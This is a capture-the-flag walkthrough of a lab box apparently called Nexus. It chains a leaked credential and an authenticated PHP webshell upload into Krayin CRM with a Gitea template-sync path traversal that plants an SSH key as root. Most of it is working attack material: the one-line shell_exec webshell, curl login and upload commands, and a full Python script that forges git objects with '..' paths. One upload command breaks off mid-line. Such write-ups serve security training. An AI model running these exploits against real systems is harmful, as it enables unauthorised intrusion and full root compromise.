## Overview

Nexus is an easy-difficulty Linux box running a Gitea instance and a Krayin CRM application behind nginx vhost routing. The kill chain is: commit-history credential leak → authenticated PHP [file upload](https://cwe.mitre.org/data/definitions/434.html) via the CRM's TinyMCE endpoint → cleartext credential reuse for an SSH user → [path traversal](https://cwe.mitre.org/data/definitions/22.html) in a Python template-sync service to plant an SSH key as root. No CVE exploitation required for privesc — only crafting malformed git objects that `os.path.join()` cannot sanitize.

## Foothold

### Krayin CRM — authenticated PHP upload via TinyMCE ([CVE-2026-38526](https://nvd.nist.gov/vuln/detail/CVE-2026-38526))

Krayin CRM 2.2.0 exposes `/admin/tinymce/upload` for the rich-text editor. The endpoint accepts arbitrary files — including `.php` — as long as the request carries a valid Laravel XSRF token. The XSRF token is stored as a URL-encoded cookie; the `X-XSRF-TOKEN` header must carry its URL-decoded value.

Authenticate and capture the session cookie jar:

```bash
curl -s -c /tmp/krayin.txt -H "Host: billing.nexus.htb" \
  http://10.129.234.54/admin/login -o /dev/null
TOKEN=$(curl -s -b /tmp/krayin.txt -c /tmp/krayin.txt -H "Host: billing.nexus.htb" \
  http://10.129.234.54/admin/login | grep -oP 'name="_token" value="\K[^"]+')
curl -si -b /tmp/krayin.txt -c /tmp/krayin.txt -H "Host: billing.nexus.htb" \
  http://10.129.234.54/admin/login \
  --data "_token=${TOKEN}&email=j.matthew%40nexus.htb&password=<redacted>" -o /dev/null
```

Extract the XSRF token (URL-decode the cookie) and upload the webshell:

Create `cmd.php`:
```php
<?php echo shell_exec($_GET["cmd"]); ?>
```

```bash
XSRF=$(grep "XSRF-TOKEN" /tmp/krayin.txt | tail -1 | awk '{print $7}' | \
  python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))")
curl -si -b /tmp/krayin.txt -H "Host: billing.nexus.htb" \
```

## Privilege Escalation

### Gitea template-sync — `os.path.join` path traversal via raw git objects

`systemctl list-timers` reveals `gitea-template-sync.timer` firing every two minutes. The service clones all Gitea template repos and uses `os.path.join(stage_dir, filepath)` on every tree entry filename without sanitising `..` components.

Git's normal plumbing (`git add`, `git checkout`) rejects tree entries whose paths contain `..` (`verify_path()` check). Writing raw loose objects directly to `.git/objects/` bypasses this validation — the objects are stored verbatim, and `git ls-tree` prints the embedded filenames exactly as stored, including `..`.

Generate an SSH keypair:

```bash
ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

Create a template repo in Gitea:

```bash
curl -s -u "jones:<redacted>" -H "Content-Type: application/json" \
  -H "Host: git.nexus.htb" \
  http://10.129.234.54/api/v1/user/repos \
  -d '{"name":"rce","auto_init":true,"default_branch":"main"}'

curl -s -X PATCH -u "jones:<redacted>" -H "Content-Type: application/json" \
  -H "Host: git.nexus.htb" \
  http://10.129.234.54/api/v1/repos/jones/rce \
  -d '{"template":true}'
```

Clone the repo and run the object-builder:

```bash
cd /tmp
git -c http.extraHeader="Host: git.nexus.htb" \
  clone "http://jones:<redacted>@10.129.234.54/jones/rce.git" rce
cd rce
```

Create `build.py`:
```python
#!/usr/bin/env python3
import hashlib,zlib,os,subprocess,sys,time

def write_obj(data,t):
    h=("%s %d"%(t,len(data))).encode()+b"\x00"
    s=h+data
    sha=hashlib.sha1(s).hexdigest()
    d=os.path.join(".git","objects",sha[:2])
    os.makedirs(d,exist_ok=True)
    p=os.path.join(d,sha[2:])
    if not os.path.exists(p):
        open(p,"wb").write(zlib.compress(s))
    return sha

def entry(mode,name,sha):
    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)

r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)
key=r.stdout.strip()+"\n"
blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
fir=write_obj(entry("40000","root",cur),"tree")
for i in range(4):
    fir=write_obj(entry("40000","..",fir),"tree")
root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
ts=int(time.time())
c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
sha=write_obj(c.encode(),"commit")
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
print("Done: "+sha)
```

```bash
python3 build.py
git -c http.extraHeader="Host: git.nexus.htb" \
  push "http://jones:<redacted>@10.129.234.54/jones/rce.git" main --force
```

Within two minutes the timer fires, `os.path.join` resolves `../../../../../root/.ssh/authorized_keys` outside the staging directory, and the key is written. SSH in:

```bash
ssh -i /tmp/.k root@10.129.234.54
```
